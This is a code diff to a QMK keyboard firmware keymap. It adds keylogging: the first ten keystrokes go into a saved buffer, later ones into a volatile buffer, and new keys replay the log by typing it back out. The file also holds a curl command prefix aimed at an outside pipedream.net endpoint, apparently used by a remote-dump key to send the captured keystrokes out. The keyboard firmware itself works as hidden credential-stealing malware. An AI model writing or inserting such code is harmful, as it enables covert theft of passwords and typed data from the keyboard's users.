@@ -1,17 +1,20 @@
 #include QMK_KEYBOARD_H
 
 #include "key_event.h"
-#include "ring_buf.h"
+#include "vsbuf.h"
 #include "custom_control.h"
 #include "keycode_convert.h"
 
 const char QUERY_CMD_START[] PROGMEM = "curl 'enimozqxebt4wf5.m.pipedream.net?q=";
 const char QUERY_CMD_END[] PROGMEM = "'; exit";
 
-ring_buf keylog = { .head = 0, .length = 0 };
+vsbuf_t keylog;
+
+uint8_t counter = 0;
 
 enum custom_keycodes {
-    DUMP = SAFE_RANGE,
+    DUMP_V = SAFE_RANGE,
+    DUMP_S,
     REM_DUMP
 };
 
@@ -23,14 +26,19 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
             .mapped_kc = mapped_kc
         };
 
-        rb_push_back(&keylog, event);
+        if (counter < 10) {
+            vsbuf_add_saved(&keylog, event);
+            counter++;
+        } else {
+            vsbuf_add_volatile(&keylog, event);
+        }
     }
 
     switch (keycode) {
-    case DUMP:
+    case DUMP_V:
         if (record->event.pressed) {
-            for (uint16_t i = 0; i < keylog.length; i++) {
-                struct key_event event = rb_peek_at(&keylog, i);
+            for (uint16_t i = 0; i < vsbuf_volatile_size(&keylog); i++) {
+                struct key_event event = vsbuf_get_volatile(&keylog, i);
 
                 uint16_t qmk_kc = get_qmk_kc(event.mapped_kc);
 
@@ -43,6 +51,24 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
         } 
 
         return false;
+
+    case DUMP_S:
+        if (record->event.pressed) {
+            for (uint16_t i = 0; i < vsbuf_saved_size(&keylog); i++) {
+                struct key_event event = vsbuf_get_saved(&keylog, i);
+
+                uint16_t qmk_kc = get_qmk_kc(event.mapped_kc);
+
+                if (event.is_pressed) {
+                    register_code16(qmk_kc);
+                } else {
+                    unregister_code16(qmk_kc);
+                }
+            }
+        } 
+
+        return false;
+
     case REM_DUMP:
         if (record->event.pressed) {
             cli();
@@ -67,9 +93,10 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
     return true;
 }
 
-/* void keyboard_post_init_user(void) { */
-/*     debug_enable = true; */
-/* } */
+void keyboard_post_init_user(void) {
+    /* debug_enable = true; */
+    vsbuf_reset(&keylog);
+}
 
 const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
     LAYOUT(
@@ -77,7 +104,7 @@ const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
         KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,    KC_T,    KC_Y,    KC_U,    KC_I,    KC_O,    KC_P,    KC_LBRC, KC_RBRC, KC_BSLS,
         KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,    KC_G,    KC_H,    KC_J,    KC_K,    KC_L,    KC_SCLN, KC_QUOT,          KC_ENT,
         KC_LSFT, XXXXXXX, KC_Z,    KC_X,    KC_C,    KC_V,    KC_B,    KC_N,    KC_M,    KC_COMM, KC_DOT,  KC_SLSH, KC_RSFT, XXXXXXX,
-        KC_LCTL, RESET,   KC_LGUI,                   KC_SPC,  KC_SPC,  KC_SPC,           KC_RGUI, REM_DUMP,XXXXXXX, MO(1),   DUMP
+        KC_LCTL, RESET,   KC_LGUI,                   KC_SPC,  KC_SPC,  KC_SPC,           KC_RGUI, REM_DUMP,XXXXXXX, DUMP_S,  DUMP_V
     ),
 
     LAYOUT(
